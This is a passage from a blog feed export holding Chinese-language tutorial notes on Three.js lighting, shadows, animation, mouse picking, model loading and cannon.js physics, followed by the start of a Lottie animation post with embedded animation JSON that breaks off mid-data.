THREE.PointLight(<span class="number">0xffffff</span>, <span class="number">50</span>)</span><br><span class="line">pointLight.position.x = <span class="number">2</span></span><br><span class="line">pointLight.position.y = <span class="number">3</span></span><br><span class="line">pointLight.position.z = <span class="number">4</span></span><br><span class="line">scene.add(pointLight)</span><br><span class="line"></span><br><span class="line"><span class="comment">// DirectionLight å¹³è¡Œå…‰ï¼Œæ¨¡æ‹Ÿå¤ªé˜³å…‰</span></span><br><span class="line"><span class="keyword">const</span> directionalLight = <span class="keyword">new</span> THREE.DirectionalLight(<span class="number">0xffffff</span>, <span class="number">1.5</span>)</span><br><span class="line">directionalLight.position.set(<span class="number">2</span>, <span class="number">2</span>, - <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="3-2-é˜´å½±-Shadow"><a href="#3-2-é˜´å½±-Shadow" class="headerlink" title="3.2 é˜´å½± Shadow"></a>3.2 é˜´å½± Shadow</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¼€å¯Rendererçš„é˜´å½±æ•ˆæœ</span></span><br><span class="line">renderer.shadowMap.enabled = <span class="literal">false</span></span><br><span class="line">renderer.shadowMap.type = THREE.PCFSoftShadowMap</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰mesh / lightæ˜¯å¦æŠ•å°„é˜´å½±ï¼Œæ˜¯å¦æ¥æ”¶é˜´å½±</span></span><br><span class="line">pointLight.castShadow = <span class="literal">true</span></span><br><span class="line">mesh.receiveShadow = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾ç½®shadowçš„å±æ€§</span></span><br><span class="line">mesh.shadow.mapSize.width = <span class="number">256</span> <span class="comment">// é˜´å½±è´´å›¾çš„å®½åº¦</span></span><br><span class="line">mesh.shadow.mapSize.height = <span class="number">256</span> <span class="comment">// é˜´å½±è´´å›¾çš„é«˜åº¦</span></span><br><span class="line">mesh.shadow.camera.far = <span class="number">7</span></span><br></pre></td></tr></table></figure><p><br> </p><h3 id="4-è¿åŠ¨"><a href="#4-è¿åŠ¨" class="headerlink" title="4. è¿åŠ¨"></a>4. è¿åŠ¨</h3><h4 id="4-1-è®¡æ—¶å™¨-Clock"><a href="#4-1-è®¡æ—¶å™¨-Clock" class="headerlink" title="4.1 è®¡æ—¶å™¨ Clock"></a>4.1 è®¡æ—¶å™¨ Clock</h4><p><code>Clock</code> ç”¨äºè·Ÿè¸ªæ—¶é—´</p><ul><li>new THREE.Clock()</li><li>clock.getElapsedTime() è·å–æ—¶é’Ÿè¿è¡Œçš„æ€»æ—¶é•¿</li><li>clock.start() å¯åŠ¨æ—¶é’Ÿ</li><li>clock.stop() åœæ­¢æ—¶é’Ÿ</li><li>clock.getDelta() è·å–<code>.oldTime</code>è®¾ç½®ååˆ°å½“å‰çš„ç§’æ•°</li><li>clock.oldTime å­˜å‚¨æœ€åä¸€æ¬¡è°ƒç”¨<code>start</code>, <code>getElapsedTime</code>, <code>getDelta</code>çš„æ—¶é—´</li></ul><p>ä½¿ç”¨<code>requestAnimationFrame</code>, <code>Three.Clock</code>, <code>getElapsedTime</code>æ”¹å˜ç‰©ä½“çš„positionå®ç°åŠ¨ç”»å¾ªç¯ã€‚<br>å¦‚ä¸‹é¢ä»£ç æ‰€ç¤ºï¼ŒåŠ¨ç”»çš„æ›´æ–°åº”è¯¥ä¾èµ–<code>elapsedTime</code>, è€Œä¸æ˜¯å•çº¯çš„å åŠ ï¼Œ<em>æ¥è§£å†³ä¸åŒè®¾å¤‡åˆ·æ–°ç‡ä¸åŒçš„é—®é¢˜</em>ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> clock = <span class="keyword">new</span> THREE.Clock()</span><br><span class="line"><span class="keyword">const</span> tick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> elapsedTime = clock.getElapsedTime()</span><br><span class="line">  mesh.rotation.y = elapsedTime; <span class="comment">// right</span></span><br><span class="line">  mesh.rotation.y += <span class="number">1</span> <span class="comment">// wrong</span></span><br><span class="line">  renderer.render(scene, camera)</span><br><span class="line">  <span class="built_in">window</span>.requestAnimationFrame(tick)</span><br><span class="line">&#125;</span><br><span class="line">tick()</span><br></pre></td></tr></table></figure><h4 id="4-2-å¸§ç‡æ£€æµ‹-Stat"><a href="#4-2-å¸§ç‡æ£€æµ‹-Stat" class="headerlink" title="4.2 å¸§ç‡æ£€æµ‹ Stat"></a>4.2 å¸§ç‡æ£€æµ‹ Stat</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Stat <span class="keyword">from</span> <span class="string">'three/examples/jsm/libs/stats.module'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> stat = <span class="keyword">new</span> Stat()</span><br><span class="line"><span class="built_in">document</span>.body.append(stat.dom)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  stat.update()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-é¼ æ ‡äº¤äº’"><a href="#5-é¼ æ ‡äº¤äº’" class="headerlink" title="5. é¼ æ ‡äº¤äº’"></a>5. é¼ æ ‡äº¤äº’</h3><h4 id="5-1-äº¤äº’-OrbitControls"><a href="#5-1-äº¤äº’-OrbitControls" class="headerlink" title="5.1 äº¤äº’ OrbitControls"></a>5.1 äº¤äº’ OrbitControls</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> controls = <span class="keyword">new</span> OrbitControls(camera, canvas)</span><br><span class="line">controls.enableDamping = <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="5-2-é¼ æ ‡æ‹¾å–-Raycaster"><a href="#5-2-é¼ æ ‡æ‹¾å–-Raycaster" class="headerlink" title="5.2 é¼ æ ‡æ‹¾å– Raycaster"></a>5.2 é¼ æ ‡æ‹¾å– Raycaster</h4><p><code>Raycaster</code>å…‰çº¿æŠ•å°„ï¼Œé€šè¿‡åœ¨åœºæ™¯ä¸­å‘å°„ä¸€æ¡ä»ç›¸æœºå‡ºå‘å¹¶ç©¿è¿‡é¼ æ ‡ç‚¹å‡»ä½ç½®çš„å°„çº¿ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æµ‹åˆ°å°„çº¿ä¸å“ªäº›å¯¹è±¡ç›¸äº¤ï¼Œä»è€Œå®ç°ç”¨æˆ·ä¸3Då¯¹è±¡çš„äº¤äº’ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> raycaster = <span class="keyword">new</span> THREE.Raycaster();</span><br><span class="line"><span class="keyword">const</span> mouse = <span class="keyword">new</span> THREE.Vector2();</span><br><span class="line">â€‹</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onMouseClick</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line"> Â <span class="comment">// å°†é¼ æ ‡ä½ç½®è½¬æ¢ä¸ºå½’ä¸€åŒ–è®¾å¤‡åæ ‡(NDC)</span></span><br><span class="line"> Â mouse.x = (event.clientX / <span class="built_in">window</span>.innerWidth) * <span class="number">2</span> - <span class="number">1</span>;</span><br><span class="line"> Â mouse.y = - (event.clientY / <span class="built_in">window</span>.innerHeight) * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line"> Â <span class="comment">// é€šè¿‡ç›¸æœºå’Œé¼ æ ‡ä½ç½®æ›´æ–°å°„çº¿</span></span><br><span class="line"> Â raycaster.setFromCamera(mouse, camera);</span><br><span class="line"> Â <span class="comment">// è®¡ç®—ç‰©ä½“å’Œå°„çº¿çš„äº¤ç‚¹</span></span><br><span class="line"> Â <span class="keyword">const</span> intersects = raycaster.intersectObjects(scene.children);</span><br><span class="line"> Â <span class="keyword">if</span> (intersects.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line"> Â  Â <span class="comment">// å¦‚æœæœ‰äº¤ç‚¹ï¼Œæ›´æ”¹ç¬¬ä¸€ä¸ªäº¤ç‚¹ç‰©ä½“çš„é¢œè‰²</span></span><br><span class="line"> Â  Â intersects[<span class="number">0</span>].object.material.color.set(<span class="number">0xff0000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">â€‹</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'click'</span>, onMouseClick);</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'mousemove'</span>, onMouseClick);</span><br></pre></td></tr></table></figure></p><h3 id="5-å…¶ä»–"><a href="#5-å…¶ä»–" class="headerlink" title="5. å…¶ä»–"></a>5. å…¶ä»–</h3><h4 id="4-3-çª—å£äº‹ä»¶"><a href="#4-3-çª—å£äº‹ä»¶" class="headerlink" title="4.3 çª—å£äº‹ä»¶"></a>4.3 çª—å£äº‹ä»¶</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, () =&gt;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Update sizes</span></span><br><span class="line">  sizes.width = <span class="built_in">window</span>.innerWidth</span><br><span class="line">  sizes.height = <span class="built_in">window</span>.innerHeight</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Update camera</span></span><br><span class="line">  camera.aspect = sizes.width / sizes.height</span><br><span class="line">  camera.updateProjectionMatrix()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Update renderer</span></span><br><span class="line">  renderer.setSize(sizes.width, sizes.height)</span><br><span class="line">  renderer.setPixelRatio(<span class="built_in">Math</span>.min(<span class="built_in">window</span>.devicePixelRatio, <span class="number">2</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="4-4-è°ƒè¯•å·¥å…·-debug-ui"><a href="#4-4-è°ƒè¯•å·¥å…·-debug-ui" class="headerlink" title="4.4 è°ƒè¯•å·¥å…· debug ui"></a>4.4 è°ƒè¯•å·¥å…· debug ui</h4><p>ä½¿ç”¨<code>lil-gui</code>åŒ…<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> GUI <span class="keyword">from</span> <span class="string">'lil-gui'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> gui = <span class="keyword">new</span> GUI()</span><br></pre></td></tr></table></figure></p><h4 id="4-5-åŠ è½½blender-model"><a href="#4-5-åŠ è½½blender-model" class="headerlink" title="4.5 åŠ è½½blender model"></a>4.5 åŠ è½½blender model</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; GLTFLoader &#125; <span class="keyword">from</span> <span class="string">'three/examples/jsm/loaders/GLTFLoader.js'</span></span><br><span class="line"><span class="keyword">import</span> &#123; DRACOLoader &#125; <span class="keyword">from</span> <span class="string">'three/examples/jsm/loaders/DRACOLoader.js'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dracoLoader = <span class="keyword">new</span> DRACOLoader()</span><br><span class="line">dracoLoader.setDecoderPath(<span class="string">'/draco/'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> gltfLoader = <span class="keyword">new</span> GLTFLoader()</span><br><span class="line">gltfLoader.setDRACOLoader(dracoLoader)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> mixer = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">gltfLoader.load(<span class="string">'/models/Fox/glTF/Fox.gltf'</span>, (gltf) =&gt; &#123;</span><br><span class="line">  gltf.scene.scale.set(<span class="number">0.025</span>, <span class="number">0.025</span>, <span class="number">0.025</span>)</span><br><span class="line">  scene.add(gltf.scene)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Animation</span></span><br><span class="line">  mixer = <span class="keyword">new</span> THREE.AnimationMixer(gltf.scene)</span><br><span class="line">  <span class="keyword">const</span> action = mixer.clipAction(gltf.animations[<span class="number">2</span>])</span><br><span class="line">  action.play()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="5-ç‰©ç†ä¸–ç•Œ-cannon-js"><a href="#5-ç‰©ç†ä¸–ç•Œ-cannon-js" class="headerlink" title="5. ç‰©ç†ä¸–ç•Œ cannon.js"></a>5. ç‰©ç†ä¸–ç•Œ cannon.js</h3><p><code>cannon.js</code> 3dç‰©ç†å¼•æ“, å®˜ç½‘ï¼š<a href="https://schteppe.github.io/cannon.js/" target="_blank" rel="noopener">https://schteppe.github.io/cannon.js/</a></p><h4 id="5-1-World-ç‰©ç†ä¸–ç•Œ"><a href="#5-1-World-ç‰©ç†ä¸–ç•Œ" class="headerlink" title="5.1 World ç‰©ç†ä¸–ç•Œ"></a>5.1 World ç‰©ç†ä¸–ç•Œ</h4><ul><li>new CANNON.World() å»ºç«‹ç‰©ç†ä¸–ç•Œ</li><li>world.broadphase è®¾ç½®é»˜è®¤æ£€æµ‹ç¢°æ’æ–¹å¼</li><li>world.allowSleep </li><li>world.gravity.set(0, -9.82, 0)<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> CANNON <span class="keyword">from</span> <span class="string">'cannon-es'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªé‡åŠ›ä¸º-9.82 mÂ²/s çš„ç‰©ç†ä¸–ç•Œ</span></span><br><span class="line"><span class="keyword">const</span> world = <span class="keyword">new</span> CANNNON.World()</span><br><span class="line">word.broadphase = <span class="keyword">new</span> CANNON.SAPBroadphase(world)</span><br><span class="line">world.allowSleep = <span class="literal">true</span></span><br><span class="line">world.gravity.set(<span class="number">0</span>, - <span class="number">9.82</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure></li></ul><h4 id="5-2-Body-ç‰©ä½“"><a href="#5-2-Body-ç‰©ä½“" class="headerlink" title="5.2 Body ç‰©ä½“"></a>5.2 Body ç‰©ä½“</h4><p>å»ºç«‹ç‰©ä½“ new CANNON.Body()<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> objectsToUpdate = [] <span class="comment">// å­˜å‚¨éœ€è¦æ›´æ–°çš„ç‰©ç†å¯¹è±¡å’Œå¯¹åº”çš„three.jså¯¹è±¡</span></span><br><span class="line"><span class="keyword">const</span> sphereGeometry = <span class="keyword">new</span> THREE.SphereGeometry(<span class="number">1</span>, <span class="number">20</span>, <span class="number">20</span>)</span><br><span class="line"><span class="keyword">const</span> sphereMaterial = <span class="keyword">new</span> THREE.MeshStandardMaterial(&#123;</span><br><span class="line">    metalness: <span class="number">0.3</span>,</span><br><span class="line">    roughness: <span class="number">0.4</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> createSphere = <span class="function">(<span class="params">radius, position</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> mesh = <span class="keyword">new</span> THREE.Mesh(sphereGeometry, sphereMaterial)</span><br><span class="line">  mesh.castShadow = <span class="literal">true</span></span><br><span class="line">  mesh.scale.set(radius, radius, radius)</span><br><span class="line">  mesh.position.copy(position)</span><br><span class="line">  scene.add(mesh)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// cannon.js body</span></span><br><span class="line">  <span class="keyword">const</span> shape = <span class="keyword">new</span> CANNON.Sphere(radius)</span><br><span class="line">  <span class="keyword">const</span> body = <span class="keyword">new</span> CANNON.Body(&#123;</span><br><span class="line">    mass: <span class="number">1</span>,</span><br><span class="line">    position: <span class="keyword">new</span> CANNON.Vec3(<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>),</span><br><span class="line">    shape,</span><br><span class="line">    material: defaultMaterial</span><br><span class="line">  &#125;)</span><br><span class="line">  body.position.copy(position)</span><br><span class="line">  world.addBody(body)</span><br><span class="line">  objectsToUpdate.push(&#123; mesh, body &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="5-3-åœ°æ¿"><a href="#5-3-åœ°æ¿" class="headerlink" title="5.3 åœ°æ¿"></a>5.3 åœ°æ¿</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªè´¨é‡ä¸º0çš„åœ°æ¿ï¼Œå½¢çŠ¶ä¸ºå¹³é¢ï¼Œæ·»åŠ åˆ°ç‰©ç†ä¸–ç•Œ</span></span><br><span class="line"><span class="keyword">const</span> floorShape = <span class="keyword">new</span> CANNON.Plane()</span><br><span class="line"><span class="keyword">const</span> floorBody = <span class="keyword">new</span> CANNON.Body()</span><br><span class="line">floorBody.mass = <span class="number">0</span></span><br><span class="line">floorBody.addShape(floorShape)</span><br><span class="line">floorBody.quaternion.setFromAxisAngle(<span class="keyword">new</span> CANNON.Vec3(- <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="built_in">Math</span>.PI * <span class="number">0.5</span>) </span><br><span class="line">world.addBody(floorBody)</span><br></pre></td></tr></table></figure><h4 id="5-4-æ›´æ–°ç‰©ç†ä¸–ç•Œ"><a href="#5-4-æ›´æ–°ç‰©ç†ä¸–ç•Œ" class="headerlink" title="5.4 æ›´æ–°ç‰©ç†ä¸–ç•Œ"></a>5.4 æ›´æ–°ç‰©ç†ä¸–ç•Œ</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> clock = <span class="keyword">new</span> THREE.Clock()</span><br><span class="line"><span class="keyword">let</span> oldElapsedTime = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> elapsedTime = clock.getElapsedTime()</span><br><span class="line">  <span class="keyword">const</span> deltaTime = elapsedTime - oldElapsedTime</span><br><span class="line">  oldElapsedTime = elapsedTime</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Update physics</span></span><br><span class="line">  world.step(<span class="number">1</span> / <span class="number">60</span>, deltaTime, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// å°†cannon.jsç‰©ä½“ä¸three.jsç‰©ä½“å…³è”èµ·æ¥</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> object <span class="keyword">of</span> objectsToUpdate) &#123;</span><br><span class="line">    object.mesh.position.copy(object.body.position)</span><br><span class="line">    object.mesh.quaternion.copy(object.body.quaternion)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Render</span></span><br><span class="line">  renderer.render(scene, camera)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Call tick again on the next frame</span></span><br><span class="line">  <span class="built_in">window</span>.requestAnimationFrame(tick)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tick()</span><br></pre></td></tr></table></figure><h4 id="5-5-ç§»é™¤ç‰©ä½“"><a href="#5-5-ç§»é™¤ç‰©ä½“" class="headerlink" title="5.5 ç§»é™¤ç‰©ä½“"></a>5.5 ç§»é™¤ç‰©ä½“</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> object <span class="keyword">of</span> objectsToUpdate) &#123;</span><br><span class="line">  world.removeBody(object.body)</span><br><span class="line">  scene.remove(object.mesh)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">objectsToUpdate.splice(<span class="number">0</span>, objectsToUpdate.length)</span><br></pre></td></tr></table></figure><p>-</p><h3 id="å…¶ä»–å¸¸è§ç”»é¢"><a href="#å…¶ä»–å¸¸è§ç”»é¢" class="headerlink" title="å…¶ä»–å¸¸è§ç”»é¢"></a>å…¶ä»–å¸¸è§ç”»é¢</h3><ul><li>particles ç²’å­ï¼Œ 17-particles-final</li><li>galaxy æ˜Ÿç³», 18-galaxy-generator-final</li><li>scroll æ»šåŠ¨æ•ˆæœ 19-scroll-based-animation-final</li><li><em>Axes-helper åæ ‡è¾…åŠ©çº¿</em></li></ul><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="">Bç«™ Three.js Jounery</a></li><li><a href="">Bç«™ è¿›å three.jsæ•™ç¨‹-ä»å…¥é—¨åˆ°å…¥é—¨</a></li></ul>]]></content>
      
      <categories>
          
          <category> åŠ¨ç”»/åª’ä½“ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” Lottie åŠ¨ç”»</title>
      <link href="/2024/11/13/lottie%E5%8A%A8%E7%94%BB/"/>
      <url>/2024/11/13/lottie%E5%8A%A8%E7%94%BB/</url>
      <content type="html"><![CDATA[<p>Lottieæ˜¯ airbnb å¼€æºçš„å¯åº”ç”¨äºWeb, Android, iOS,WindowsåŠ¨ç”»åº“ã€‚å®ƒæä¾›äº†ä¸€å¥—ä» AE åˆ°å„ä¸ªç»ˆç«¯çš„å·¥å…·æµï¼Œè®¾è®¡å¸ˆé€šè¿‡ AE å°†åšå¥½çš„åŠ¨ç”»å¯¼å‡ºæˆjsonï¼Œå†é€šè¿‡ Lottie å„ç«¯çš„åº“å°±å¯ä»¥å®ç°åŠ¨ç”»æ•ˆæœï¼ŒåŠ¨ç”»è¿˜åŸåº¦ 100%ã€‚</p><ul><li><a href="https://codepen.io/collection/nVYWZR/" target="_blank" rel="noopener">å„ç§åŠ¨ç”»Demo</a></li><li><a href="https://lottiefiles.com/" target="_blank" rel="noopener">lottieåŠ¨ç”»èµ„æºåº“ï¼šhttps://lottiefiles.com</a></li></ul><div id="lottie" style="display: block; width: 200px; height: 200px"></div><script src="https://unpkg.com/lottie-web@5.12.2/build/player/lottie.min.js"></script><script>lottie.loadAnimation({   container: document.getElementById('lottie'),    renderer: 'svg',   loop: true,   autoplay: false,   animationData:  {  "v": "5.8.1",  "fr": 60,  "ip": 0,  "op": 65,  "w": 400,  "h": 400,  "nm": "Comp 1",  "ddd": 0,  "assets": [  ],  "layers": [    {      "ddd": 0,      "ind": 1,      "ty": 4,      "nm": "Lapa",      "sr": 1,      "ks": {        "o": {          "a": 0,          "k": 100,          "ix": 11        },        "r": {          "a": 1,          "k": [            {              "i": {                "x": [                  0.34                ],                "y": [                  1                ]              },              "o": {                "x": [                  0.66                ],                "y": [                  0                ]              },              "t": 7,              "s": [                49              ]            },            {              "t": 53,              "s": [                -39              ]            }          ],          "ix": 10        },        "p": {          "a": 1,          "k": [            {              "i": {                "x": 0.34,                "y": 1              },              "o": {                "x": 0.66,                "y": 0              },              "t": 5,              "s": [                168.5,                250,                0              ],              "to": [                -5.417,                0,                0              ],              "ti": [                0,                0,                0              ]            },            {              "i": {                "x": 0.34,                "y": 1              },              "o": {                "x": 0.66,                "y": 0              },              "t": 31,              "s": [                136,                250,                0              ],              "to": [                0,                0,                0              ],              "ti": [                -5.417,                0,                0              ]            },            {              "t": 58,              "s": [                180.5,                250,                0              ]            }          ],          "ix": 2,          "l": 2        },        "a": {          "a": 0,          "k": [            -66.5,            50,            0          ],          "ix": 1,          "l": 2        },        "s": {          "a": 0,          "k": [            100,            100,            100          ],          "ix": 6,          "l": 2        }      },      "ao": 0,      "shapes": [        {          "ty": "gr",          "it": [            {              "ind": 0,              "ty": "sh",              "ix": 1,              "ks": {                "a": 0,                "k": {                  "i": [                    [                      0,                      0                    ],                    [                      -1,                      -16                    ],                    [                      -4.5,                      -3                    ],                    [                      -8,                      6.5                    ],                    [                      0,                      0                    ]                  ],                  "o": [                    [                      0,                      0                    ],                    [                      1,                      16                    ],                    [                      4.5,                      3                    ],                    [                      7.703,                      -6.258                    ],                    [                      0,                      0                    ]                  ],                  "v": [                    [                      -68,                      40                    ],                    [                      -114.5,                      41                    ],                    [                      -109,                      55.75                    ],                    [                      -91.5,                      51                    ],                    [                      -70.5,                      62.5                    ]                  ],                  "c": true                },                "ix": 2              },              "nm": "Path 1",              "mn": "ADBE Vector Shape - Group",              "hd": false            },            {              "ty": "fl",              "c": {                "a": 0,                "k": [                  0,                  0,                  0,                  1                ],                "ix": 4              },              "o": {                "a": 0,                "k": 100,                "ix": 5              },              "r": 1,              "bm": 0,              "nm": "Fill 1",              "mn": "ADBE Vector Graphic - Fill",              "hd": false            },            {              "ty": "tr",              "p": {                "a": 0,                "k": [                  -68,                  39.5                ],                "ix": 2              },              "a": {                "a": 0,                "k": [                  -68,                  39.5                ],                "ix": 1              },              "s": {                "a": 0,                "k": [                  100,                  100                ],                "ix": 3              },              "r": {                "a": 0,                "k": 0,                "ix": 6              },              "o": {                "a": 0,                "k": 100,                "ix": 7              },              "sk": {                "a": 0,                "k": 0,                "ix": 4              },              "sa": {                "a": 0,                "k": 0,                "ix": 5              },              "nm": "Transform"            }          ],          "nm": "Shape 1",          "np": 3,          "cix": 2,          "bm": 0,          "ix": 1,          "mn": "ADBE Vector Group",          "hd": false        }      ],      "ip": 0,      "op": 65,      "st": 0,      "bm": 0    },    {      "ddd": 0,      "ind": 2,      "ty": 4,      "nm": "tale",      "sr": 1,      "ks": {        "o": {          "a": 0,          "k": 100,          "ix": 11        },        "r": {          "a": 0,          "k": 0,          "ix": 10        },        "p": {          "a": 0,          "k": [            232.625,            200.5,            0          ],          "ix": 2,          "l": 2        },        "a": {          "a": 0,          "k": [            0,            0,            0          ],          "ix": 1,          "l": 2        },        "s": {          "a": 0,          "k": [            106.374,            101.081,            100          ],          "ix": 6,          "l": 2        }      },      "ao": 0,      "shapes": [        {          "ty": "gr",          "it": [            {              "ind": 0,              "ty": "sh",              "ix": 1,              "ks": {                "a": 1,                "k": [                  {                    "i": {                      "x": 0.29,                      "y": 1                    },                    "o": {                      "x": 0.71,                      "y": 0                    },                    "t": 0,                    "s": [                      {                        "i": [                          [                            0,                            0                          ],                          [                            20.5,                            -43.5                          ],                          [                            8.5,                            0                          ]                        ],                        "o": [                          